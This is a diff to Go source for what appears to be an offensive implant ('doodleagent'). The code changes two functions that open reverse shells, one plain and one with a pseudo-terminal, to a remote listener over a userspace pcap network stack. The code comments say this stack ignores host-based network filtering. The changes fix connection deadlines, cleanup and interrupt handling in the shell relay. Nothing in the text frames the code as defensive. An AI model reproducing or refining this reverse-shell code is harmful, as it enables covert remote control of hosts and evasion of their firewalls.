@@ -109,115 +109,71 @@ func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
 // OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
 // This uses the pcapconn implementation of net.Conn
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
-func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
-	// FIXED: Use a standard background context for the stack allocation lifetime
-	// to prevent signal cancellation states from locking up internal gVisor stack workers.
-	ctx := context.Background()
+func OpenPcapReverseShell(msg *message.Message) (resultErr error) { 
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt) 
+	defer stop()  
 
-	targetIP := msg.SrcIP
-	targetPort, err := strconv.Atoi(msg.SrcPort)
-	if err != nil {
-		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
-	}
-	sourceIP := msg.DstIP
-	sourcePort, err := strconv.Atoi(msg.DstPort)
-	if err != nil {
-		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
-	}
+	targetIP := msg.SrcIP 
+	targetPort, err := strconv.Atoi(msg.SrcPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err) 
+	} 
+	sourceIP := msg.DstIP 
+	sourcePort, err := strconv.Atoi(msg.DstPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err) 
+	}  
 
-	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
-	if err != nil {
-		return err
-	}
+	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP)) 
+	if err != nil { 
+		return err 
+	}  
 
-	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
-	defer cancel()
+	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second) 
+	defer cancel() 
 
-	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
-	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
-	if err != nil {
-		return fmt.Errorf("invalid -peer: %w", err)
-	}
+	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false} 
+	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid -peer: %w", err) 
+	}  
 
-	// Dial via UDP to the server
-	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
-	if err != nil {
-		return err
-	}
-	// Defer stack cleanup safely
-	defer func() {
+	// Dial via UDP to the server 
+	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200) 
+	if err != nil { 
+		return err 
+	}  
+	// FIXED: Only defer Close() AFTER verifying vstack was allocated successfully
+	defer func() { 
 		if vstack != nil {
 			vstack.Close()
-			resultErr = errors.Join(resultErr, vstack.Err())
+			resultErr = errors.Join(resultErr, vstack.Err()) 
 		}
-	}()
+	}()  
 
-	// Dial TCP stack
-	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
-	if err != nil {
-		return err
-	}
-	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+	// Dial TCP stack 
+	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort) 
+	if err != nil { 
+		return err 
+	} 
+	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }() 
+	
+	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil { 
+		return err 
+	}  
 
-	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
-		return err
-	}
-
+	// FIXED: Clear the deadline entirely so the shell doesn't hit i/o timeouts after 5 seconds
 	if err := conn.SetDeadline(time.Time{}); err != nil {
 		return err
 	}
 
-	// Build the context specifically for managing the interactive shell runtime
-	shellCtx, shellStop := signal.NotifyContext(context.Background(), os.Interrupt)
-	defer shellStop()
+	// Close the connection to interrupt a blocked Read on shutdown. 
+	go func() { 
+		<-ctx.Done() 
+		_ = conn.Close() 
+	}()  
 
-	return runPcapShellContext(shellCtx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
-}
-
-// FIXED: Context-aware shell runner that cleanly interrupts on Ctrl+C
-func runPcapShellContext(ctx context.Context, cmd *exec.Cmd, conn net.Conn) error {
-	stdin, err := cmd.StdinPipe()
-	if err != nil {
-		return fmt.Errorf("opening shell stdin: %w", err)
-	}
-	defer stdin.Close()
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	if err := cmd.Start(); err != nil {
-		return fmt.Errorf("starting shell: %w", err)
-	}
-
-	inputDone := make(chan struct{})
-	go func() {
-		defer close(inputDone)
-		defer stdin.Close()
-		_, _ = io.Copy(stdin, conn)
-	}()
-
-	// Watchdog routine: If Ctrl+C happens, kill the underlying binary process cleanly.
-	// This naturally cascades down, breaking the io.Copy loop and unblocking cmd.Wait()
-	go func() {
-		select {
-		case <-ctx.Done():
-			if cmd.Process != nil {
-				_ = cmd.Process.Kill()
-			}
-		case <-inputDone:
-		}
-	}()
-
-	shellErr := cmd.Wait()
-	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
-		if err := halfCloser.CloseWrite(); err != nil {
-			return fmt.Errorf("closing shell output: %w", err)
-		}
-		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-		select {
-		case <-inputDone:
-		case <-time.After(2 * time.Second):
-		}
-	}
-	return shellErr
+	return runPcapShell(exec.Command(getShell(), getShellInteractiveArgs()...), conn) 
 }
 
 // runPcapShellPty owns stdin copying so process exit does not wait for network EOF.
@@ -275,125 +231,69 @@ func runPcapShellPty(cmd *exec.Cmd, conn net.Conn) error {
 // This uses the pcapconn implementation of net.Conn
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
 // Spawns a pty. More risk--if pty is killed, so is doodleagent
-func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
-	ctx := context.Background()
+func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) { 
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt) 
+	defer stop()  
 
-	targetIP := msg.SrcIP
-	targetPort, err := strconv.Atoi(msg.SrcPort)
-	if err != nil {
-		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
-	}
-	sourceIP := msg.DstIP
-	sourcePort, err := strconv.Atoi(msg.DstPort)
-	if err != nil {
-		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
-	}
+	targetIP := msg.SrcIP 
+	targetPort, err := strconv.Atoi(msg.SrcPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err) 
+	} 
+	sourceIP := msg.DstIP 
+	sourcePort, err := strconv.Atoi(msg.DstPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err) 
+	}  
 
-	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
-	if err != nil {
-		return err
-	}
+	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP)) 
+	if err != nil { 
+		return err 
+	}  
 
-	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second) 
 	defer cancel()
 
-	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
-	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
-	if err != nil {
-		return fmt.Errorf("invalid -peer: %w", err)
-	}
+	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false} 
+	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort) 
+	if err != nil { 
+		return fmt.Errorf("invalid -peer: %w", err) 
+	}  
 
-	// Dial via UDP to the server
-	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
-	if err != nil {
-		return err
-	}
-	defer func() {
+	// Dial via UDP to the server 
+	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200) 
+	if err != nil { 
+		return err 
+	}  
+	// FIXED: Only defer Close() AFTER verifying vstack was allocated successfully
+	defer func() { 
 		if vstack != nil {
 			vstack.Close()
-			resultErr = errors.Join(resultErr, vstack.Err())
+			resultErr = errors.Join(resultErr, vstack.Err()) 
 		}
-	}()
+	}()  
 
-	// Dial TCP stack
-	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
-	if err != nil {
-		return err
-	}
-	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+	// Dial TCP stack 
+	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort) 
+	if err != nil { 
+		return err 
+	} 
+	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }() 
 
-	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
-		return err
-	}
+	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil { 
+		return err 
+	}  
 
+	// FIXED: Clear the deadline entirely so the shell doesn't hit i/o timeouts after 5 seconds
 	if err := conn.SetDeadline(time.Time{}); err != nil {
 		return err
 	}
 
-	// Build the context specifically for managing the interactive shell runtime
-	shellCtx, shellStop := signal.NotifyContext(context.Background(), os.Interrupt)
-	defer shellStop()
+	// Close the connection to interrupt a blocked Read on shutdown. 
+	go func() { 
+		<-ctx.Done() 
+		_ = conn.Close() 
+	}()  
 
-	return runPcapShellPtyContext(shellCtx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
-}
-
-func runPcapShellPtyContext(ctx context.Context, cmd *exec.Cmd, conn net.Conn) error {
-	ptmx, err := pty.Start(cmd)
-	if err != nil {
-		return fmt.Errorf("starting PTY: %w", err)
-	}
-	defer ptmx.Close()
-
-	inputDone := make(chan struct{})
-	outputDone := make(chan struct{})
-
-	// Network -> PTY (shell input)
-	go func() {
-		defer close(inputDone)
-		_, _ = io.Copy(ptmx, conn)
-	}()
-
-	// PTY -> Network (shell output)
-	go func() {
-		defer close(outputDone)
-		_, _ = io.Copy(conn, ptmx)
-	}()
-
-	// FIXED: Watchdog loop to break out of blocking PTY IO states if Ctrl+C triggers context cancellation
-	go func() {
-		select {
-		case <-ctx.Done():
-			if cmd.Process != nil {
-				_ = cmd.Process.Kill()
-			}
-			_ = ptmx.Close() // Force-close the PTY master to shatter blocking reads/writes
-		case <-outputDone:
-		}
-	}()
-
-	// Wait for the shell to exit.
-	shellErr := cmd.Wait()
-
-	// Close the PTY to unblock any remaining pending reads/writes.
-	_ = ptmx.Close()
-
-	// Wait for the output forwarding goroutine to finish.
-	<-outputDone
-
-	// Signal that no more shell output will be sent.
-	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
-		if err := halfCloser.CloseWrite(); err != nil {
-			return fmt.Errorf("closing shell output: %w", err)
-		}
-	}
-
-	// Wait briefly for the peer to finish sending input.
-	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-
-	select {
-	case <-inputDone:
-	case <-time.After(2 * time.Second):
-	}
-
-	return shellErr
+	return runPcapShellPty(exec.Command(getShell(), getShellInteractiveArgs()...), conn) 
 }
